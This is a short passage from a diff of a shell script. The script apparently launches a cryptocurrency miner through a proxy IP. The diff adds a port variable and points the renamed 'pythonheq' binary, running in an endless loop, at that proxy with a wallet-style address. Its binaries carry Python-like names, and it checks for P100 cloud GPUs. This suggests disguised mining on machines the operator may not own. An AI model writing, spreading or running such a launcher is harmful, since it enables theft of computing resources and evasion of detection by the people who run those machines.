@@ -6,7 +6,8 @@ echo -e '#######################################################################
 PROX=78.47.69.185
 ETPort=8080
 RVPort=80
-echo -e '################## '"MAX $PROX:$ETPort"' Ver:0.0.5     ################'
+VCPort=6006
+echo -e '################## '"MAX $PROX:$ETPort"' Ver:0.0.6     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -144,7 +145,7 @@ cp pyeth2 pyethoc
 i="0"
 while true
 do
-./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutx 2>> ooutx &
+./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutx 2>> ooutx &
 GPU=NULL
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
